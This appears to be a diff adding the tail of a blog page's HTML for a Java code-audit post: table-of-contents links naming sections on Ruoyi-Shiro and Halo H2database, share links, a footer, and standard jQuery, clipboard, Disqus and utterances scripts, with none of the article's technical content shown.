<span class="toc-text">Ruoyi-Shiro1.4.2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">1、反序列化：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">2、权限绕过：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Halo-H2database-1-4-197"><span class="toc-number">1.1.4.</span> <span class="toc-text">Halo-H2database 1.4.197</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&text=java代码审计-开发组件"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&is_video=false&description=java代码审计-开发组件"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=java代码审计-开发组件&body=Check out this article: https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&title=java代码审计-开发组件"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&name=java代码审计-开发组件&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/&t=java代码审计-开发组件"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
